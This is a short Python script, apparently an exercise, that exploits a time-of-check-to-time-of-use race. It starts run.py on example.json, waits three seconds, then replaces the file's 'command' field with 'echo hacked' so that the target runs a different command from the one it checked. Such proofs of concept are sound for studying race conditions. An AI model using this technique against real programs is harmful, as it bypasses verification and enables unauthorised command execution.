import json
import os
import re
import subprocess

RUNPY = "run.py"
EXAMPLE = "example.json"

def main(argv):
    
    #create a sub process to run python3 run.py example.json
    sub_process = subprocess.Popen(["python3", RUNPY, EXAMPLE]) 
    os.system("sleep 3")  #wait for run to start verification 
    
    with open(EXAMPLE, 'r') as reader:
        data = json.load(reader)
    data["command"] = "echo hacked" #change the content of file
    
    with open(EXAMPLE, 'w') as writer: #write back the data
        writer.write(json.dumps(data))
     
    sub_process.wait()


if __name__ == '__main__':
    import sys
    sys.exit(main(sys.argv))



